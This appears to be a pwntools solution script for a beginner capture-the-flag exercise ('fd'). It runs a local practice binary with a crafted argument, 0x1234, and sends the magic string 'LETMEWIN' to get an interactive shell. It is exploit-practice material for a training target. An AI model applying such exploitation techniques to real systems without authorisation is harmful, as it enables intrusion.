#!/usr/bin/env python3
from pwn import *

r = process(['./fd', str(0x1234)])
r.sendline('LETMEWIN')
r.interactive()